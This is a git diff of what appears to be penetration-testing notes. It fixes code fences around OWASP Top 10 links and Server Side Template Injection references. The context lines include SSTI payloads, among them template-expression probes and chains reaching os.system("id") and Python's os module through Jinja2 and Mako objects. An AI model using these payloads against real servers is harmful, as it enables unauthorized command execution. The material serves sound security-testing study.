@@ -28,66 +28,66 @@
 
 ### owasp top 10
 
-´´´
+```
 https://owasp.org/
-´´´
+```
 
 ### Broken Access Control
-´´´
+```
 https://owasp.org/Top10/A01_2021-Broken_Access_Control/
-´´´
+```
 
 ### Cryptographic Failures 
-´´´
+```
 https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
-´´´
+```
 
 ### Injection
-´´´
+```
 https://owasp.org/Top10/A03_2021-Injection/
-´´´
+```
 
 ### Insecure Design
-´´´
+```
 https://owasp.org/Top10/A04_2021-Insecure_Design/
-´´´
+```
 
 ### Security Misconfiguration
-´´´
+```
 https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
-´´´
+```
 
 ### Vulnerable and Outdated Components
-´´´
+```
 https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
-´´´
+```
 
 ### Identification and Authentication Failures 
-´´´
+```
 https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures
-´´´
+```
 
 ### Security Logging and Monitoring Failures
-´´´
+```
 https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
-´´´
+```
 
 ### Server-Side Request Forgery
-´´´
+```
 https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
-´´´
+```
 
 ### Server Side Template Injection
-´´´
+```
 https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
-´´´
-´´´
+```
+```
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-´´´
-´´´
+```
+```
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
-´´´
-´´´
+```
+```
 {{4*4}}[[5*5]]
 {{7*7}}
 {{7*'7'}}
@@ -197,4 +197,4 @@ ${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
 {{cycler.__init__.__globals__.os}}
 {{joiner.__init__.__globals__.os}}
 {{namespace.__init__.__globals__.os}}
-´´´
+```
